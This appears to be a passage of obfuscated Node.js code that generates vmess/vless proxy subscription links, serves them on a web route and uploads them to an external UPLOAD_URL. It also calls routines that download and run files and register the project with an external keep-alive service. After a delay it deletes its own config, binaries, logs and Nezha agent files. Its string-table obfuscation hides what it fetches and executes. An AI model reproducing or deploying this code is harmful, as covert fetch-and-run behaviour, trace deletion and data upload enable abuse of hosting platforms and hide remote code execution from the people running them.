_0x39b5b5=_0x396b,_0xc6bac5={'v':'2','ps':''+_0x33ebe2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x39b5b5(0x14b),'net':'ws','type':_0x39b5b5(0x14b),'host':_0x2bf973,'path':_0x39b5b5(_0x21c3dd._0x346955),'tls':_0x39b5b5(_0x21c3dd._0x344229),'sni':_0x2bf973,'alpn':'','fp':_0x39b5b5(0x155)},_0x26e5fd=_0x39b5b5(0xec)+UUID+'@'+CFIP+':'+CFPORT+_0x39b5b5(_0x21c3dd._0x948e7f)+_0x2bf973+_0x39b5b5(0x120)+_0x2bf973+_0x39b5b5(0x100)+_0x33ebe2+_0x39b5b5(0x132)+Buffer['from'](JSON[_0x39b5b5(0x159)](_0xc6bac5))['toString']('base64')+_0x39b5b5(0x158)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2bf973+_0x39b5b5(0x120)+_0x2bf973+_0x39b5b5(_0x21c3dd._0x336457)+_0x33ebe2+'\x0a\x20\x20\x20\x20';console[_0x39b5b5(_0x21c3dd._0x539f86)](Buffer[_0x39b5b5(_0x21c3dd._0x1cb319)](_0x26e5fd)['toString'](_0x39b5b5(0x14e))),fs[_0x39b5b5(0xa9)](subPath,Buffer['from'](_0x26e5fd)['toString'](_0x39b5b5(_0x21c3dd._0x52a7c8))),console[_0x39b5b5(0xa4)](FILE_PATH+_0x39b5b5(0x139)),uploadNodes(),app[_0x39b5b5(_0x21c3dd._0x33f0d8)]('/'+SUB_PATH,(_0x3cd561,_0x5b539b)=>{const _0x3f26f7=_0x39b5b5,_0x3c6d78=Buffer[_0x3f26f7(0x15a)](_0x26e5fd)['toString'](_0x3f26f7(_0x2abfc3._0x5b84a8));_0x5b539b['set']('Content-Type',_0x3f26f7(_0x2abfc3._0x47997d)),_0x5b539b[_0x3f26f7(_0x2abfc3._0x477e56)](_0x3c6d78);}),_0x1d831a(_0x26e5fd);},0x7d0);});}}async function uploadNodes(){const _0x35dc40={_0x4cb0be:0xf6,_0x32965c:0x15d,_0x2a44f5:0xa4,_0x39be94:0x143,_0x134c0f:0x150,_0x2ca87b:0xd7,_0x5860ce:0x119,_0x465b95:0xbf,_0x191b49:0x134,_0x1975b1:0xbc},_0x3df870=_0x4bd9e2;if(UPLOAD_URL&&PROJECT_URL){const _0x459a83=PROJECT_URL+'/'+SUB_PATH,_0x50e57d={'subscription':[_0x459a83]};try{const _0x420641=await axios[_0x3df870(_0x35dc40._0x4cb0be)](UPLOAD_URL+_0x3df870(0x11c),_0x50e57d,{'headers':{'Content-Type':_0x3df870(_0x35dc40._0x32965c)}});return _0x420641&&_0x420641[_0x3df870(0x150)]===0xc8?(console[_0x3df870(_0x35dc40._0x2a44f5)]('Subscription\x20uploaded\x20successfully'),_0x420641):null;}catch(_0x5ac316){if(_0x5ac316['response']){if(_0x5ac316[_0x3df870(_0x35dc40._0x39be94)][_0x3df870(_0x35dc40._0x134c0f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3df870(0x144)](listPath))return;const _0x23b8a5=fs[_0x3df870(_0x35dc40._0x2ca87b)](listPath,_0x3df870(0xf9)),_0x75fa00=_0x23b8a5[_0x3df870(_0x35dc40._0x5860ce)]('\x0a')[_0x3df870(_0x35dc40._0x465b95)](_0x2c1c16=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3df870(0xdb)](_0x2c1c16));if(_0x75fa00[_0x3df870(_0x35dc40._0x191b49)]===0x0)return;const _0x3130fe=JSON[_0x3df870(0x159)]({'nodes':_0x75fa00});try{const _0x25c08b=await axios['post'](UPLOAD_URL+_0x3df870(0xfc),_0x3130fe,{'headers':{'Content-Type':_0x3df870(_0x35dc40._0x32965c)}});return _0x25c08b&&_0x25c08b['status']===0xc8?(console[_0x3df870(0xa4)](_0x3df870(_0x35dc40._0x1975b1)),_0x25c08b):null;}catch(_0x3f12d2){return null;}}else return;}}function cleanFiles(){const _0x4bbb1b={_0x3c571f:0x106,_0xda9f11:0x141,_0x5319a8:0xb2},_0x56ff59={_0x1f2f8f:0x104,_0x232bb8:0x12c};setTimeout(()=>{const _0x2094c0={_0x3a456d:0x136,_0x39504d:0x104,_0x56c2d2:0xa4},_0x8d4485=_0x396b,_0x222e02=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x222e02[_0x8d4485(0xef)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x222e02[_0x8d4485(0xef)](phpPath);process['platform']==='win32'?exec('del\x20/f\x20/q\x20'+_0x222e02[_0x8d4485(_0x4bbb1b._0x3c571f)]('\x20')+_0x8d4485(_0x4bbb1b._0xda9f11),_0x1db331=>{const _0x37af4b=_0x8d4485;console[_0x37af4b(_0x2094c0._0x3a456d)](),console['log'](_0x37af4b(_0x2094c0._0x39504d)),console[_0x37af4b(_0x2094c0._0x56c2d2)](_0x37af4b(0x12c));}):exec(_0x8d4485(_0x4bbb1b._0x5319a8)+_0x222e02[_0x8d4485(_0x4bbb1b._0x3c571f)]('\x20')+_0x8d4485(0x135),_0x463960=>{const _0x11713e=_0x8d4485;console[_0x11713e(0x136)](),console[_0x11713e(0xa4)](_0x11713e(_0x56ff59._0x1f2f8f)),console[_0x11713e(0xa4)](_0x11713e(_0x56ff59._0x232bb8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4c87ed={_0x4d5e75:0xd2,_0x2b228c:0xa4,_0x2d1e0b:0x11d},_0x915c69=_0x4bd9e2;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3106ac=await axios[_0x915c69(0xf6)](_0x915c69(_0x4c87ed._0x4d5e75),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x915c69(0x15d)}});return console[_0x915c69(_0x4c87ed._0x2b228c)](_0x915c69(0xaf)),_0x3106ac;}catch(_0x1f3658){return console[_0x915c69(0x113)](_0x915c69(_0x4c87ed._0x2d1e0b)+_0x1f3658[_0x915c69(0x14c)]),null;}}async function startserver(){const _0x4084a1={_0x32792c:0xbd},_0x4c7877=_0x4bd9e2;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3110ad){console['error'](_0x4c7877(_0x4084a1._0x32792c),_0x3110ad);}}startserver()['catch'](_0x21ab6f=>{const _0x3fea9a={_0x38c270:0xee},_0x35269b=_0x4bd9e2;console['error'](_0x35269b(_0x3fea9a._0x38c270),_0x21ab6f);}),app['listen'](PORT,()=>console['log'](_0x4bd9e2(0xfe)+PORT+'!'));
